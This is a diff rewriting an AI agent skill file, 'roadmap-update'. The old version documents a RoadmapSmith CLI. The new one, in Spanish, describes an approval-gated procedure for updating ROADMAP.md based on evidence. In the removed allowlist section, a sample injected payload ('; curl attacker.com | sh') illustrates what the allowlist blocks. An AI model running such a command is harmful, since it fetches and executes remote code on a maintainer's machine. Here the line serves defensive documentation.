@@ -1,126 +1,116 @@
 ---
 name: roadmap-update
-description: Refresh ROADMAP.md with evidence-backed validation, add tasks, record evidence, or check northStar drift using the RoadmapSmith CLI.
+description: Update ROADMAP.md truthfully based on real code. Full-scan the repo, evaluate evidence per task, propose a diff for user approval. Never flips [x] without verifiable evidence in code.
 ---
 
-# RoadmapSmith Update
+# roadmap-update
 
-Use this skill when the user wants to sync the roadmap after code changes, add a new task, mark a task complete with evidence, or check if the project has drifted from its northStar.
+**Trigger (manual):** user types `/roadmap-update`, or says "actualizá el roadmap", "update the roadmap", or equivalent.
 
-## Safety
+**Trigger (proactivo):** al terminar una tarea en la sesión actual que parezca coincidir con una task de ROADMAP.md, proponer el update antes de responder al user.
 
-As of v0.13.0, `roadmapsmith update` is annotate-only by default: it writes ⚠️ / ✅ sub-bullets but never flips `[ ]`/`[x]` checkboxes. Checkbox mutation is gated behind `--apply`.
+Este skill es hermano de `roadmap-init`. Ambos comparten las mismas invariantes al final.
 
-## Required behavior
+## Procedimiento
 
-**Step 1 — Annotate + audit (safe default):**
-```
-roadmapsmith update --audit --project-root .
-```
-Writes ⚠️ / ✅ sub-bullets. Zero checkbox mutation. Review the audit output — the "Unchecked by this run" list will be empty because nothing was flipped; focus on "Ready but unchecked" and "Checked with weak evidence".
+### 1. Locate ROADMAP.md
 
-**Step 2 — Apply mutations (after reviewing Step 1):**
-```
-roadmapsmith update --apply --project-root .
-```
-Flips `[ ] → [x]` for tasks whose evidence was found and `[x] → [ ]` for tasks whose evidence is missing. Use `--dry-run` if you want the mutation preview without writing.
+Buscar en este orden:
+1. `ROADMAP.md` (repo root)
+2. `roadmap.md` (repo root)
+3. `docs/roadmap.md`
+4. `TODO.md` (último recurso)
 
-**Add a new task:**
-```
-roadmapsmith update --add-task "Task description" --project-root .
-```
+Si ninguno existe, decirle al user: "no encuentro ROADMAP.md. Corré `/roadmap-init` primero" y parar.
 
-**Record evidence for a specific task:**
-```
-roadmapsmith update --task TASK-ID --evidence "path/to/file.js passes tests" --project-root .
-```
+### 2. Full scan del estado actual
 
-**Check northStar drift** (requires `product.northStar` in `roadmap-skill.config.json`):
-```
-roadmapsmith update --check-drift --project-root .
-```
+- Read el ROADMAP.md completo. Extraer TODAS las líneas de task (`- [ ] ...` y `- [x] ...`), preservando `<!-- rs:task=... -->` markers si existen.
+- Glob code files: `**/*.{js,ts,jsx,tsx,py,go,rs,rb,java,kt,swift,cs,php}` excluyendo `node_modules .git dist build .next coverage __pycache__ .venv .worktrees`.
+- Read `package.json` / `pyproject.toml` / `Cargo.toml` para nombre, deps, scripts.
+- `git log --oneline -20` para commits recientes.
 
-Available update flags:
-- `--apply` — flip `[ ]`/`[x]` checkboxes (default is annotate-only)
-- `--add-task <text>` — insert a new task into the managed block
-- `--task <id>` — task ID to target (use with `--evidence`)
-- `--evidence <text>` — evidence to attach to `--task`
-- `--audit` — show validation audit after refresh (grouped by cause: `path-mismatch`, `no-evidence`, `deletion-task`, `namespace-gate`, `strict-mode`)
-- `--evidence-only` — legacy alias; now a silent no-op since annotate-only is the default
-- `--concise` / `--no-warnings` — suppress ⚠️ warning lines in the emitted markdown (safe for READMEs / PR embeds)
-- `--check-drift` — compare northStar to repo state; exits `2` when drift is detected
-- `--strict` — strict validation mode (preservedCheckedState does not count as pass)
-- `--dry-run` — preview without writing
-- `--json` — output in JSON format
-- `--project-root <path>` — project root (default: cwd)
+### 3. Evaluar evidence por task (multi-signal)
 
-## Task marker attributes
+Para cada task, combinar estas señales:
 
-Tasks use a stable-id comment: `<!-- rs:task=slug -->`. As of v0.13.0, the same comment can carry two orthogonal axes:
+- **Grep**: extraer 2-3 keywords significativos del texto (nombres propios, function names, paths). Buscar en los code files.
+- **File/function match**: si la task menciona un archivo o función específica (ej: `src/auth.js`, `loginUser()`), verificar que exista.
+- **Session context**: si en el chat actual ya leíste/escribiste files que matchean la task, contar como señal.
+- **Git log**: si un commit reciente menciona la task, weight it.
 
-**State axis — `rs:planned`:**
-- `rs:planned` — "intentionally not implemented yet". Validator skips evidence hunt. Sync emits **no** ⚠️ warning and does not flip the checkbox. Use for future scope you want on the roadmap without polluting every refresh with warnings. Example: `- [ ] Ship v0.2 feature X <!-- rs:task=ship-x rs:planned -->`.
+Asignar un nivel de evidence a cada task:
+- **strong**: múltiples señales convergen en files específicos
+- **weak**: 1 sola señal, ambigua o genérica
+- **none**: cero señal en el repo
+- **ambiguous**: > 5 candidatos, no confident
 
-**Kind axis — `rs:kind=<rollup|command|manual>`:**
-- `rs:kind=rollup` — "milestone/aggregator; children carry the evidence". Passes validation without a file-existence hunt. Use for phase exits, milestone rollups, "Finalize module implementation" style parent tasks. Example: `- [x] Milestone v0.2 shipped <!-- rs:task=milestone-v0-2 rs:kind=rollup -->`.
-- `rs:kind=command` + `rs:verified-by=<command>` — "evidence = a command exits 0". Passes validation on the marker alone during `update` (no shell execution). To actually run the command and flip the checkbox, use `roadmapsmith verify --task <id> --run`. Example: `- [ ] TypeScript compila sin errores <!-- rs:task=tsc-clean rs:kind=command rs:verified-by=tsc-noemit -->`. Note: `rs:verified-by` captures a single non-whitespace token — use a script path or an npm-script name if the command needs arguments.
-- `rs:kind=manual` — human-attested completion. Trust the checked state, no evidence hunt. Use for delete/cleanup tasks whose completion is an absence, or anything a human verified out-of-band. Example: `- [x] Eliminar directorios legacy <!-- rs:task=drop-legacy rs:kind=manual -->`.
+### 4. Manejar ambigüedad
 
-An unknown `rs:kind=<value>` throws a parse error listing the three valid values.
+Si una task tiene evidence `ambiguous` (>5 candidatos posibles), NO DECIDIR autónomo. En el diff proposal, listar los top 3 candidatos y preguntar al user:
 
-### Migration from pre-v0.13 markers
+"'<task text>' — ¿se refiere a alguno de estos? [1: <fileA>] [2: <fileB>] [3: <fileC>] [ninguna]"
 
-`rs:evidence=manual` and `rs:no-test` are removed. `parseRoadmap` throws with a `Deprecated marker …` error when it encounters either. Run this once per repo before upgrading to 0.13.0:
+Esperar respuesta antes de decidir el diff para esa task.
 
-```
-roadmapsmith migrate-markers --project-root . --dry-run   # preview
-roadmapsmith migrate-markers --project-root .             # apply
-```
+### 5. Construir el diff proposal (NO APLICAR AÚN)
 
-The migrator rewrites `rs:evidence=manual` → `rs:kind=manual` (same bypass semantics) and drops `rs:no-test` (it was a silent no-op). Exits `0` when there is nothing to migrate.
+Reglas de transición por task:
+- `[ ]` + `strong` → propose flip a `[x]`
+- `[x]` + `none` → propose flip a `[ ]` con WARNING "marcada sin evidence"
+- `[ ]` + `weak` → mantener `[ ]`, notar "weak evidence, considerá agregar Evidence: line"
+- `[x]` + `weak` → mantener `[x]`, notar "weak backing, agregá Evidence: line para consolidar"
+- Task obsoleta (files/features que ya no existen) → propose BORRAR con confirmación explícita
+- TODOs / partial features detectados en el repo que no están en el ROADMAP → propose AGREGAR nueva task
 
-### Command allowlist (v0.13.1)
+### 6. Presentar diff + esperar OK
 
-As of v0.13.1, `verify --run` executes the `rs:verified-by` command **without shell interpretation** and only allows programs in a fixed allowlist: `npm | pnpm | yarn | npx | node | deno | bun | python | python3 | pytest | tsc | eslint | prettier | make | cargo | go | dotnet | mvn | gradle | bundle | rake | ruby`. This prevents a malicious ROADMAP.md from smuggling shell payloads (`; curl attacker.com | sh`) into a maintainer's terminal.
+Mostrar al user:
+1. El reporte estructurado (template abajo).
+2. El diff completo de cambios propuestos.
+3. Pregunta explícita: "aplico estos cambios? (ok / no / detalle)".
 
-If you need a command outside the allowlist, wrap it in an npm/yarn script and reference the script name:
+Comportamiento por respuesta:
+- `ok` → paso 7.
+- `no` → descartar todo, no escribir.
+- `detalle <n>` o rechazo específico → iterar el diff aplicando solo lo aceptado.
 
-```json
-// package.json
-"scripts": { "check:contracts": "node scripts/check-contracts.js --strict" }
-```
+### 7. Escribir y confirmar
 
-```markdown
-- [ ] Contracts pass <!-- rs:task=contracts rs:kind=command rs:verified-by=npm run check:contracts -->
-```
+Aplicar los cambios aprobados a ROADMAP.md via Edit tool. Preservar formatting, indentation, y markers exactos.
 
-The program name is logged to stderr (`+ npm run check:contracts`) as an audit trail before execution.
+Emitir el reporte final estructurado confirmando lo que se escribió.
 
-## Command-verified tasks (`verify`)
+## Invariantes (jamás violar)
 
-For tasks marked `rs:kind=command`, `roadmapsmith update --audit` prints a **"Command-verified tasks pending run"** block listing the exact ready-to-run invocation for each unchecked command task:
+- **NUNCA** flipear `[x]` sin evidence verificable (nivel `strong`).
+- **NUNCA** modificar ROADMAP.md sin mostrar el diff completo y esperar OK del user.
+- **NUNCA** borrar una task sin confirmación explícita del user.
+- **NUNCA** inventar tasks basadas solo en el chat de la sesión. Solo agregar tasks si hay señal fuerte en el REPO (TODO comments, features parciales visibles en código).
+- **NUNCA** trabajar sin haber leído el ROADMAP.md actual primero.
+- Si el ROADMAP existente es "plano" (sin markers ni metadata), respetarlo. No agregar HTML comments ni metadata rica sin permiso explícito del user.
+- Trabajar con TODO el ROADMAP en cada corrida (full scan). Nunca incremental sin decirle al user.
+
+## Template del reporte estructurado
+
+Emitir SIEMPRE al final del update, incluso cuando cero cambios. Secciones vacías se rellenan con "(ninguno)" — nunca omitir una sección.
 
 ```
-Command-verified tasks pending run (2):
-- [tsc-clean] roadmapsmith verify --task tsc-clean --run   # (would run: tsc-noemit)
-- [test-suite] roadmapsmith verify --task test-suite --run # (would run: npm-test)
+═══ roadmap-update report ═══
+
+DONE (marcadas [x] esta corrida):
+  - <task text>
+
+PENDING (siguen [ ]):
+  - <task text> (weak evidence: <file>)
+
+WARNINGS:
+  - Ambigüedad no resuelta: <task text> (esperando respuesta del user)
+  - Task [x] sin evidence: <task text> (sugerido revertir a [ ])
+  - Task obsoleta: <task text> (propuesta borrar)
+
+NEW (propuestas para agregar):
+  - <task text> (motivo: <TODO en src/foo.js:42>)
+
+═══ end report ═══
 ```
-
-When you (agent) see that block, invoke each `verify --task <id> --run` yourself — the human user should not have to type them. `verify --run` executes the `rs:verified-by` command in the repo root, prints stdout/stderr, and flips `[x]` on exit 0. Non-zero exit leaves the checkbox unchecked and CLI exits with code 2.
-
-`verify --task <id>` without `--run` is a dry-preview that just prints `Would run: <command>`.
-
-## Known limitations
-
-- **Path resolution assumes paths in task text are relative to the repo root.** Monorepos can now add a `pathAliases` object to `roadmap-skill.config.json` (e.g. `{ "/dashboard/": "apps/web/src/app/dashboard/" }`). Without it, task text needs the full prefix. Symptoms: legitimate `[x]` tasks unchecked with `missing referenced file(s): ...` on paths that DO exist under a subdirectory.
-- **Deletion tasks are recognized by keyword.** A task whose text contains `eliminado`/`eliminada`/`borrado`/`borrada`/`deleted`/`removed`/`dropped` AND names an explicit path is validated as an absence assertion: it passes when the file is absent, fails with `expected file removed, still present at <path>` if it still exists. Phrase deletion tasks accordingly, or fall back to `~~strikethrough~~` for manual attestation.
-- **Duplicate explicit Task IDs are surfaced as warnings.** If the same `<!-- rs:task=id -->` appears in two sections (e.g. plan + archive), `roadmapsmith update` prints a `⚠️  Duplicate explicit task id "<id>"` warning naming both line numbers. Sync still treats them as independent — merge or rename one.
-- **`[ ] → [x]` auto-checks emit a `✅ evidence:` sub-bullet** naming the matched file or symbol. If the sub-bullet is missing or looks weak, verify by hand — the tool can auto-check on shallow token overlap.
-
-## Before running this skill in a new repo
-
-- [ ] Are task descriptions using paths relative to the repo root? For monorepos, add a `pathAliases` object in `roadmap-skill.config.json` mapping the prefix used in task text (e.g. `/dashboard/`) to the real subdirectory (`apps/web/src/app/dashboard/`).
-- [ ] Does the roadmap duplicate explicit task IDs across sections? The tool will warn but not merge — decide whether to consolidate or rename.
-- [ ] Are there tasks phrased as deletions (`"X eliminado"`, `"X removed"`, `"borrado"`)? Confirm the file path is quoted with backticks so the deletion pass can extract it.
-
-Always use `--dry-run` first when uncertain about the impact.
